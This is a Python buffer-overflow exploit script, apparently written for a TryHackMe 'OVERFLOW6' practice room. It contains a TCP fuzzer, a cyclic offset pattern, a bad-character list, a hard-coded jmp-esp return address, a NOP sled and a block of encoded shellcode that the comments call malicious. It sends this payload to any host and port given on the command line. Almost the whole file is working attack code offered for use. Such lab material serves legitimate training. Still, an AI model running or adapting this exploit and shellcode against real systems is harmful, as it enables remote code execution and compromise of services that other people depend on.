##################################################
##@jockmedlinux @ 2023-01-08					##
##################################################
import os,sys,subprocess,socket,argparse,time
from struct import pack
parser = argparse.ArgumentParser(description='Easy script for buffer overflow by @jockemedlinux')
parser.add_argument('-F', action='store_true', help='Fuzz the application')
parser.add_argument('-B', action='store_true', help='Send the buffer')
parser.add_argument('-O', action='store_true', default='', help='Find the offset', required=False)
parser.add_argument('-C', action='store_true', default='', help='Check for bad characters', required=False)
parser.add_argument('-H', type=str, default='127.0.0.1', help='Host "IP"', required=False)
parser.add_argument('-P', type=int, default='1337', help='Port', required=False)

args = parser.parse_args()

# // fun stuff.
cowsending = subprocess.getoutput("echo 'Sending beezneez:::' | cowsay")
cowsent = subprocess.getoutput("echo ':::Beezneez sent' | cowsay")
cowfail	= subprocess.getoutput("echo 'Is it even running, guy?' | cowsay")
cowquit	= subprocess.getoutput("echo 'Quitter..' | cowsay -d")
cowprofit = subprocess.getoutput("echo 'Did we get it?' | cowsay -e '0o'")
timeout = 5

# // Tinker variables
prefix = "OVERFLOW6 "			#Special prefix for THM
offset = 1034					#Found offset
As = "A" * offset				#Overflow
Bs = "BBBB"						#EIP-control
retn = "\xAF\x11\x50\x62"		#return-address (jmp-esp or push-esp) Save input here. [ADDRESS:"625011AF" | LittleEndian: "\xAF\x11\x50\x62"]
nops = "\x90" * 16				#\x90
nullbyte = ""					#\x00

# // Cyclic brakepoint.[SAVE INPUT HERE| ADDRESS:"" | LE: " " ]
cyclic = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# // Malicious shellcode to run. (if not using buf as above)
#identified bad characters here --> [ \x00\xa9\xcd\xd4 ]

shellcode = ("\xba\xa4\x72\x2f\x1b\xd9\xe9\xd9\x74\x24\xf4\x5e\x33\xc9"
"\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\xf2\x7c\xcd\xee\x06"
"\x68\x93\x11\xf6\x69\xf4\x98\x13\x58\x34\xfe\x50\xcb\x84"
"\x74\x34\xe0\x6f\xd8\xac\x73\x1d\xf5\xc3\x34\xa8\x23\xea"
"\xc5\x81\x10\x6d\x46\xd8\x44\x4d\x77\x13\x99\x8c\xb0\x4e"
"\x50\xdc\x69\x04\xc7\xf0\x1e\x50\xd4\x7b\x6c\x74\x5c\x98"
"\x25\x77\x4d\x0f\x3d\x2e\x4d\xae\x92\x5a\xc4\xa8\xf7\x67"
"\x9e\x43\xc3\x1c\x21\x85\x1d\xdc\x8e\xe8\x91\x2f\xce\x2d"
"\x15\xd0\xa5\x47\x65\x6d\xbe\x9c\x17\xa9\x4b\x06\xbf\x3a"
"\xeb\xe2\x41\xee\x6a\x61\x4d\x5b\xf8\x2d\x52\x5a\x2d\x46"
"\x6e\xd7\xd0\x88\xe6\xa3\xf6\x0c\xa2\x70\x96\x15\x0e\xd6"
"\xa7\x45\xf1\x87\x0d\x0e\x1c\xd3\x3f\x4d\x49\x10\x72\x6d"
"\x89\x3e\x05\x1e\xbb\xe1\xbd\x88\xf7\x6a\x18\x4f\xf7\x40"
"\xdc\xdf\x06\x6b\x1d\xf6\xcc\x3f\x4d\x60\xe4\x3f\x06\x70"
"\x09\xea\x89\x20\xa5\x45\x6a\x90\x05\x36\x02\xfa\x89\x69"
"\x32\x05\x40\x02\xd9\xfc\x03\x27\x10\xd1\x02\x5f\x2e\x2d"
"\xb4\xfc\xa7\xcb\xdc\xec\xe1\x44\x49\x94\xab\x1e\xe8\x59"
"\x66\x5b\x2a\xd1\x85\x9c\xe5\x12\xe3\x8e\x92\xd2\xbe\xec"
"\x35\xec\x14\x98\xda\x7f\xf3\x58\x94\x63\xac\x0f\xf1\x52"
"\xa5\xc5\xef\xcd\x1f\xfb\xed\x88\x58\xbf\x29\x69\x66\x3e"
"\xbf\xd5\x4c\x50\x79\xd5\xc8\x04\xd5\x80\x86\xf2\x93\x7a"
"\x69\xac\x4d\xd0\x23\x38\x0b\x1a\xf4\x3e\x14\x77\x82\xde"
"\xa5\x2e\xd3\xe1\x0a\xa7\xd3\x9a\x76\x57\x1b\x71\x33\x77"
"\xfe\x53\x4e\x10\xa7\x36\xf3\x7d\x58\xed\x30\x78\xdb\x07"
"\xc9\x7f\xc3\x62\xcc\xc4\x43\x9f\xbc\x55\x26\x9f\x13\x55"
"\x63")

# // THM Room specifics.
string = prefix + "A" * 100

# // The buffer
buffer = ""
buffer += prefix
buffer += As
#buffer += Bs
buffer += retn
buffer += nops
#buffer += cyclic
#buffer += badchars
buffer += shellcode

def close():
	print("\nProgram closing.")
	print(cowquit)
	sys.exit()

def crash():
	print(cowprofit)
	sys.exit()

def run():
	print(cowfail)
	sys.exit()
	#def offset():
	lenght = int(input("How many characters do you wanna create? "))
	pattern = cyclic(lenght)
	print("\nCreated string: ")
	print(pattern.decode())
	print("\n")
	find = input("What is the input you wanna search for? ")
	offset = cyclic_find(str(find), n=len(pattern))
	print(offset)

#def badchars():

def fuzzer():
	global prefix
	global string
	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				#result = s.connect_ex((args.H, args.P))
				s.settimeout(timeout)
				s.connect((args.H, args.P))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except KeyboardInterrupt:
			close()
		except socket.gaierror as e:
			print(f'Error: {e}')
			run()
		except socket.error as e2:
			if len(string) - len(prefix) > 100:
				print(f'\nError:{e2}')
				print(f'You seem to have crashed it.\n')
				print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
				crash()
			else:
				print(f'Error: {e2}')
				run()
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			crash()
		string += 100 * "A"
		
# // Buffer overflow
def main():
	global buffer
	global cowsending
	print(cowsending)
	print(bytes(buffer, "latin-1"))
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((args.H, args.P))
			s.recv(1024)
			s.send(bytes(buffer, "latin-1"))
			s.recv(1024)
	except KeyboardInterrupt:
		close()
	except:
		print(cowsent)

if args.F:
	fuzzer()
elif args.B:
	main()
#elif args.O:
#	offset()
#elif args.C:
	#badchars()
else:
	print("\033[1;31;40m \n##You need to use either the Fuzzer (-F) module, or the Buffer (-B) module##\n")
	print("\033[1;32;40m Bright Green \n")
	parser.print_help()	